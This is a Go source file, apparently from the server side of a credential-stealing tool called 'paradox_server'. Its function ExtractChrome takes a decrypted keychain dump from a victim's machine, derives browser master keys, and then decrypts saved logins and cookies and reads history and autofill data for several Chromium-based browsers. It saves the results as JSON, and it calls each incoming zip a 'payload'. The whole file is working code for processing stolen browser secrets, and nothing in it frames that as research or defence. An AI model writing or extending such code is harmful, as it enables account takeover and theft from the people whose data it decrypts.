package extract

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"paradox_server/decode"
	"paradox_server/fileops"
	"paradox_server/models"
	"paradox_server/static"
	"path/filepath"
	"strings"
	"time"
)

func ExtractChrome(decodedKeychain models.DecryptedKeychain, sysInfo models.SystemInfo, extractDir string, zipPath string) (models.ExtractionResults, error) {
	var masterKey []byte
	derivedKeys := make(map[string][]byte)

	for _, browser := range static.SupportedBrowsers {
		for _, entry := range decodedKeychain.GenericPasswords {
			if entry.PrintName == browser.PrintName {
				log.Printf("Found potential master key entry in keychain (Service: %s)", entry.Service)
				masterKey = decode.DeriveMasterKey([]byte(entry.Password))
				if len(masterKey) > 0 {
					log.Printf("Derived master key successfully.")
					derivedKeys[browser.Name] = masterKey
					break
				} else {
					log.Printf("DeriveMasterKey returned empty key for service %s.", entry.Service)
				}
			}
		}
	}

	if len(derivedKeys) == 0 {
		log.Printf("Could not find the necessary keychain entry or derive the master key.")
		return models.ExtractionResults{}, nil
	}

	loginDataDbName := "Login Data"
	cookiesDbName := "Cookies"
	historyDbName := "History"
	webDataDbName := "Web Data"

	allLoginDataPaths, err := fileops.FindAllFiles(extractDir, loginDataDbName)
	if err != nil {
		log.Printf("Warning: Error searching for any '%s' files in %s: %v", loginDataDbName, extractDir, err)
	}

	allCookiesPaths, err := fileops.FindAllFiles(extractDir, cookiesDbName)
	if err != nil {
		log.Printf("Warning: Error searching for any '%s' files in %s: %v", cookiesDbName, extractDir, err)
	}

	allHistoryPaths, err := fileops.FindAllFiles(extractDir, historyDbName)
	if err != nil {
		log.Printf("Warning: Error searching for any '%s' files in %s: %v", historyDbName, extractDir, err)
	}

	allWebDataPaths, err := fileops.FindAllFiles(extractDir, webDataDbName)
	if err != nil {
		log.Printf("Warning: Error searching for any '%s' files in %s: %v", webDataDbName, extractDir, err)
	}

	results := models.ExtractionResults{
		SystemInfo: sysInfo,
		Browsers:   make(map[string]models.BrowserData),
		Timestamp:  time.Now().UTC(),
	}

	for _, browser := range static.SupportedBrowsers {
		log.Printf("Processing browser: %s (Path Segment: '%s')", browser.Name, browser.PathString)
		var browserLogins []models.LoginData
		var browserCookies []models.Cookie
		var browserHistory []models.HistoryEntry
		var browserWebData []models.WebDataEntry

		loginDataPath := ""
		for _, p := range allLoginDataPaths {
			if strings.Contains(p, browser.PathString) {
				if filepath.Base(p) == loginDataDbName {
					loginDataPath = p
					log.Printf("Found '%s' for %s: %s", loginDataDbName, browser.Name, loginDataPath)
					break
				}
			}
		}

		if loginDataPath != "" {
			logins := decode.ChromeLoginData(loginDataPath, derivedKeys[browser.Name])
			if len(logins) > 0 {
				log.Printf("Extracted %d logins for %s", len(logins), browser.Name)
				browserLogins = logins
			}
		}

		cookiesPath := ""
		for _, p := range allCookiesPaths {
			if strings.Contains(p, browser.PathString) {
				if filepath.Base(p) == cookiesDbName {
					cookiesPath = p
					log.Printf("Found '%s' for %s: %s", cookiesDbName, browser.Name, cookiesPath)
					break
				}
			}
		}

		if cookiesPath != "" {
			cookies := decode.ChromeCookies(cookiesPath, derivedKeys[browser.Name], sysInfo.SystemOs)
			log.Printf("Extracted %d cookies for %s", len(cookies), browser.Name)
			browserCookies = cookies
		}

		historyPath := ""
		for _, p := range allHistoryPaths {
			if strings.Contains(p, browser.PathString) {
				if filepath.Base(p) == historyDbName {
					historyPath = p
					log.Printf("Found '%s' for %s: %s", historyDbName, browser.Name, historyPath)
					break
				}
			}
		}

		if historyPath != "" {
			history := decode.ChromeHistory(historyPath)
			log.Printf("Extracted %d history entries for %s", len(history), browser.Name)
			browserHistory = history
		}

		webDataPath := ""
		for _, p := range allWebDataPaths {
			if strings.Contains(p, browser.PathString) {
				if filepath.Base(p) == webDataDbName {
					webDataPath = p
					log.Printf("Found '%s' for %s: %s", webDataDbName, browser.Name, webDataPath)
					break
				}
			}
		}

		if webDataPath != "" {
			webData := decode.ChromeWebData(webDataPath)
			log.Printf("Extracted %d web data entries for %s", len(webData), browser.Name)
			browserWebData = webData
		}

		if len(browserLogins) > 0 || len(browserCookies) > 0 || len(browserHistory) > 0 || len(browserWebData) > 0 {
			results.Browsers[browser.Name] = models.BrowserData{
				Logins:  browserLogins,
				Cookies: browserCookies,
				History: browserHistory,
				WebData: browserWebData,
			}
		} else {
			log.Printf("No data extracted for browser %s.", browser.Name)
		}
	}

	if len(results.Browsers) > 0 {
		resultsJSON, err := json.MarshalIndent(results, "", "  ")
		if err != nil {
			log.Printf("Error marshalling results to JSON: %v", err)
		} else {
			finalOutputDir := "./decoded-output"
			if err := os.MkdirAll(finalOutputDir, 0755); err != nil {
				log.Printf("Error creating final output directory %s: %v", finalOutputDir, err)
			} else {
				baseName := strings.TrimSuffix(filepath.Base(zipPath), filepath.Ext(zipPath))
				outputFileName := fmt.Sprintf("%s_decoded_%d.json", baseName, time.Now().Unix())
				finalOutputPath := filepath.Join(finalOutputDir, outputFileName)

				err = os.WriteFile(finalOutputPath, resultsJSON, 0644)
				if err != nil {
					log.Printf("Error writing results JSON to %s: %v", finalOutputPath, err)
				} else {
					log.Printf("Successfully saved decoded data for %s to %s", baseName, finalOutputPath)
				}
			}
		}
	} else {
		log.Printf("No browser data could be extracted for payload %s.", zipPath)
	}
	return results, nil
}
